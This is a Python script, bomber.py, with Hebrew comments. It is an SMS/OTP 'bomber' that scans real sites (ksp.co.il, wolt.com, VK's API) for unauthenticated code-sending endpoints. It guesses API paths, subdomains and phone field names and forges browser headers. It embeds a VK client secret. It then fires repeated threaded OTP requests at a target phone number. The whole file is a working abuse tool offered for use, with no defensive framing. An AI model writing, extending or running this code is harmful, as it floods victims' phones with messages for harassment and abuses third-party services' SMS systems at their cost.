#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# bomber.py - יורה קודי OTP מהאתרים עצמם.
#
#   python bomber.py scan +972501234567 wolt.com ksp.co.il
#   python bomber.py test +972501234567
#   python bomber.py bomb +972501234567 3

import json, os, re, sys, threading, time
from urllib.parse import urlparse
import requests

HERE = os.path.dirname(os.path.abspath(__file__))
GOOD_FILE = os.path.join(HERE, "endpoints_ok.json")

TIMEOUT = 12
UA = ("Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36")

KEYS = ["phone", "phoneNumber", "phone_number", "mobile", "msisdn",
        "username", "cellphone", "tel", "number", "user"]

PATHS = [
    "/api/otp/send", "/api/send-otp", "/api/sms/send", "/api/auth/sms",
    "/api/auth/send-code", "/api/send-code", "/api/verify/send",
    "/api/v1/otp", "/api/v1/sms/send", "/api/phone/send-code",
    "/api/user/send-code", "/auth/send-code", "/auth/sms",
    "/otp/send", "/sendSmsCode", "/send-code", "/sms/send", "/api/otp",
]

# תת-דומיינים נפוצים של API
SUBS = ["", "api.", "www.", "consumer-api.", "api-v2.", "gateway."]

ENDPOINTS = [
    {"name": "KSP", "url": "https://www.ksp.co.il/api/otp/send", "kind": "json", "num": "p"},
    {"name": "VK", "url": "https://api.vk.com/method/auth.signup", "kind": "query", "num": "i",
     "extra": {"client_id": "2274003", "client_secret": "hHbZxrka2uZ6jB1inYsH", "v": "5.199"}},
]

_SESSIONS = {}


def variants(num):
    d = re.sub(r"\D", "", num)
    if d.startswith("972"):
        intl, local = d, "0" + d[3:]
    elif d.startswith("0"):
        intl, local = "972" + d[1:], d
    else:
        intl, local = d, d
    return {"p": "+" + intl, "i": intl, "n": local, "l": local.lstrip("0")}


def session_for(base):
    dom = urlparse(base).netloc or base
    if dom not in _SESSIONS:
        s = requests.Session()
        s.headers.update({
            "User-Agent": UA,
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "he-IL,he;q=0.9,en;q=0.8",
            "Origin": "https://" + dom,
            "Referer": "https://" + dom + "/",
        })
        _SESSIONS[dom] = s
    return _SESSIONS[dom]


def send(s, url, kind, payload):
    if kind == "json":
        return s.post(url, json=payload, timeout=TIMEOUT)
    if kind == "form":
        return s.post(url, data=payload, timeout=TIMEOUT)
    return s.get(url, params=payload, timeout=TIMEOUT)


def is_jsonish(txt):
    t = (txt or "").lstrip()
    return t.startswith("{") or t.startswith("[")


def alive(base):
    try:
        requests.get(base, timeout=8, headers={"User-Agent": UA})
        return True
    except Exception:
        return False


def extra_hosts(dom):
    out = []
    try:
        r = requests.get("https://" + dom, timeout=10, headers={"User-Agent": UA})
        for m in re.finditer(r"https://([a-z0-9][a-z0-9.\-]*\." + re.escape(dom) + r")", r.text):
            h = m.group(1)
            if h not in out and len(out) < 5:
                out.append(h)
    except Exception:
        pass
    return out


def mode_of(base, num):
    """מה האתר עושה עם נתיב שלא קיים"""
    s = session_for(base)
    try:
        r = s.post(base + "/api/zzz_nonexistent_9x8y7z", json={"phone": num}, timeout=10)
    except Exception:
        return "dead", None
    if r.status_code in (403, 429):
        return "blocked", r.status_code
    if r.status_code == 404:
        return "notfound", r.status_code
    if is_jsonish(r.text or ""):
        return "json", r.status_code
    return "spa", r.status_code


def scan_base(base, num):
    mode, code = mode_of(base, num)
    if mode == "dead":
        return []
    if mode == "blocked":
        print("  -- %s  [חסום %s]" % (base, code))
        return []
    print("  -- %s  [מצב: %s]" % (base, mode))

    hits = []
    lock = threading.Lock()

    def one(path):
        s = session_for(base)
        url = base + path
        for kind in ("json", "form"):
            try:
                r = send(s, url, kind, {"phone": num})
            except Exception:
                continue
            txt = r.text or ""
            if mode == "notfound":
                if r.status_code != 404:
                    with lock:
                        hits.append((url, kind, r.status_code, txt[:60].replace("\n", " ")))
                    return
            else:
                if is_jsonish(txt):
                    with lock:
                        hits.append((url, kind, r.status_code, txt[:60].replace("\n", " ")))
                    return

    ts = [threading.Thread(target=one, args=(p,)) for p in PATHS]
    for t in ts:
        t.start()
    for t in ts:
        t.join()

    for url, kind, code2, snip in sorted(hits):
        print("     %s  %-5s %s" % (code2, kind, url))
        print("        %s" % snip)
        print('        {"name": "?", "url": "%s", "kind": "%s", "num": "p"},' % (url, kind))
    return hits


def cmd_scan(num, domains):
    v = variants(num)
    print("מספר: " + v["p"])
    for d in domains:
        dom = d.replace("https://", "").replace("http://", "").strip("/")
        print("\n===== " + dom + " =====")
        bases = []
        for sub in SUBS:
            b = "https://" + sub + dom
            if alive(b):
                bases.append(b)
        for h in extra_hosts(dom):
            b = "https://" + h
            if b not in bases and alive(b):
                bases.append(b)
        if not bases:
            print("  הדומיין לא מגיב.")
            continue
        for b in bases:
            scan_base(b, v["p"])


def cmd_test(num):
    v = variants(num)
    print("בודק %d אתרים עם %s\n" % (len(ENDPOINTS), v["p"]))
    good = []
    lock = threading.Lock()

    def one(ep):
        s = session_for(ep["url"])
        for key in KEYS:
            payload = dict(ep.get("extra", {}))
            payload[key] = v[ep.get("num", "p")]
            try:
                r = send(s, ep["url"], ep.get("kind", "json"), payload)
            except Exception:
                continue
            txt = r.text or ""
            if r.status_code < 400 and is_jsonish(txt):
                with lock:
                    good.append({**ep, "key": key})
                    print("  + %-12s %s שדה=%s" % (ep["name"], r.status_code, key))
                    print("     %s" % txt[:70].replace("\n", " "))
                return
        print("  - %-12s אין JSON תקין" % ep["name"])

    ts = [threading.Thread(target=one, args=(e,)) for e in ENDPOINTS]
    for t in ts:
        t.start()
    for t in ts:
        t.join()

    print("\n%d עברו." % len(good))
    if good:
        with open(GOOD_FILE, "w", encoding="utf-8") as f:
            json.dump(good, f, ensure_ascii=False, indent=2)
        print("נשמר ל-" + GOOD_FILE)


def cmd_bomb(num, rounds=1, delay=0.4):
    eps = ENDPOINTS
    try:
        with open(GOOD_FILE, encoding="utf-8") as f:
            saved = json.load(f)
        if saved:
            eps = saved
    except Exception:
        pass

    v = variants(num)
    print("יורה %d בקשות (%d אתרים x %d) ל-%s\n" % (len(eps) * rounds, len(eps), rounds, v["p"]))
    ok = 0
    lock = threading.Lock()

    def one(ep):
        nonlocal ok
        s = session_for(ep["url"])
        payload = dict(ep.get("extra", {}))
        payload[ep.get("key", "phone")] = v[ep.get("num", "p")]
        try:
            r = send(s, ep["url"], ep.get("kind", "json"), payload)
        except Exception:
            return
        if r.status_code < 400:
            with lock:
                ok += 1
                print("  [%d] %s" % (ok, ep["name"]))

    for rd in range(rounds):
        print("--- סבב %d/%d ---" % (rd + 1, rounds))
        ts = [threading.Thread(target=one, args=(e,)) for e in eps]
        for t in ts:
            t.start()
        for t in ts:
            t.join()
        if rd < rounds - 1:
            time.sleep(delay)
    print("\n%d בקשות נשלחו." % ok)


def main():
    a = sys.argv[1:]
    if not a:
        print("python bomber.py scan +972501234567 wolt.com")
        print("python bomber.py test +972501234567")
        print("python bomber.py bomb +972501234567 3")
        return
    if a[0] == "scan":
        cmd_scan(a[1], a[2:] or ["wolt.com"])
    elif a[0] == "test":
        cmd_test(a[1])
    elif a[0] == "bomb":
        cmd_bomb(a[1], int(a[2]) if len(a) > 2 else 1)
    else:
        print("מצב לא מוכר")


if __name__ == "__main__":
    main()
